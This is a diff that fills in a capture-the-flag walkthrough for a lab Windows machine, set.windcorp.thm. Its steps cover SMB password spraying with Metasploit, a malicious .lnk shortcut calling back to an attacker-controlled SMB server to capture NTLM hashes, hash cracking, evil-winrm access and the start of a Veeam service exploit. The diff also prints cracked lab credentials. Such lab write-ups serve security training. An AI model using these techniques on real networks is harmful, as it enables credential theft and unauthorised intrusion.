@@ -8,7 +8,7 @@
 
 ### Flag 1
 
-1. ...
+1. Start with an nmap scan to identify open services and ports on the target machine
 
 ```bash
 nmap <TARGET_IP>
@@ -16,7 +16,7 @@ nmap <TARGET_IP>
 
 [SCREEN01]
 
-2. ...
+2. Attempt a direct connection, then add the hostname to our hosts file
 
 ```bash
 curl -v -k https://<TARGET_IP>
@@ -25,20 +25,20 @@ echo "<TARGET_IP> set.windcorp.thm" >> /etc/hosts
 
 [SCREEN02]
 
-3. Examine the search.js function in `https://set.windcorp.thm/` source ...
+3. Examine the search.js function in the `https://set.windcorp.thm/` source code to understand how the application works. The JavaScript reveals that user data is loaded from an XML file, which contains employee information
 
 ```bash
 curl -k https://set.windcorp.thm/assets/data/users.xml
 ```
 
-4. Get usernames ...
+4. Extract usernames from the users.xml file to build a list for potential attacks
 
 ```bash
 curl -k https://set.windcorp.thm/assets/data/users.xml | grep -o '<email>[^<]*</email>' | sed 's/<[^>]*>//g' | cut -d'@' -f1 | sort | uniq > usernames.txt
 ```
 
-5. ...
-   - `myrtleowe:Passw@rd`
+5. Use Metasploit's SMB login scanner to test common passwords against the discovered usernames
+   - Successfully discovered credentials: `myrtleowe:Passw@rd`
 
 ```bash
 msfconsole
@@ -52,7 +52,7 @@ creds
 
 [SCREEN03]
 
-6. ...
+6. Use the discovered credentials to access SMB shares and gather information
 
 ```bash
 smbclient -L //<TARGET_IP> -U myrtleowe
@@ -63,7 +63,7 @@ get Info.txt
 
 [SCREEN04]
 
-7. First flag ...
+7. Read the downloaded file to obtain the first flag
 
 ```bash
 cat Info.txt
@@ -75,15 +75,20 @@ cat Info.txt
 
 ### Flag 2
 
-1. Download `https://www.mamachine.org/mslink/index.en.html` ...
+1. Download and use [mslink](https://www.mamachine.org/mslink/index.en.html) tool to create a malicious .lnk file that will capture credentials when opened. The malicious shortcut will attempt to connect to our SMB server when opened
 
 ```bash
 ./mslink_v1.3.sh -l test -n shortcut -i \\\\<ATTACKER_IP>\\share -o shortcut.lnk
 zip shortcut.zip shortcut.lnk
+```
+
+2. Start an SMB server to capture authentication attempts from the malicious shortcut
+
+```bash
 sudo python3 /opt/impacket/examples/smbserver.py -smb2support share .
 ```
 
-2. ...
+3. Upload the malicious shortcut to the target's file share
 
 ```bash
 smbclient //<TARGET_IP>/Files -U myrtleowe
@@ -92,8 +97,8 @@ put shortcut.zip
 
 [SCREEN06]
 
-3. ...
-   - `MichelleWat:!!!MICKEYmouse`
+4. Wait for a user to open the malicious file, capture their NTLM hash, and crack it
+   - Successfully captured and cracked: `MichelleWat:!!!MICKEYmouse`
 
 ```bash
 john hash --wordlist=/root/Tools/wordlists/rockyou.txt
@@ -101,7 +106,7 @@ john hash --wordlist=/root/Tools/wordlists/rockyou.txt
 
 [SCREEN07]
 
-4. ...
+5. Use the cracked credentials to gain remote access via WinRM and retrieve the second flag
 
 ```bash
 evil-winrm -i <TARGET_IP> -u MichelleWat -p '!!!MICKEYmouse'
@@ -116,7 +121,7 @@ more Flag2.txt
 
 ### Flag 3
 
-1. There are port 49713 and 2805 with pid 5000 ...
+1. Examine running services and network connections to identify potential attack vectors. The output shows unusual ports 49713 and 2805 associated with process ID 5000, indicating a potentially vulnerable service
 
 ```bash
 netstat -ao
@@ -124,7 +129,7 @@ netstat -ao
 
 [SCREEN09]
 
-2. ...
+2. Identify which process is running on the discovered ports
 
 ```bash
 Get-Process -Id 5000
@@ -132,7 +137,7 @@ Get-Process -Id 5000
 
 [SCREEN10]
 
-3. ...
+3. Locate and examine the Veeam ONE Agent service files to understand the application
 
 ```bash
 Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}
@@ -141,7 +146,7 @@ Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Servi
 
 [SCREEN11]
 
-4. ...
+4. Download plink.exe to establish a tunnel for exploiting the identified service
 
 ```bash
 wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
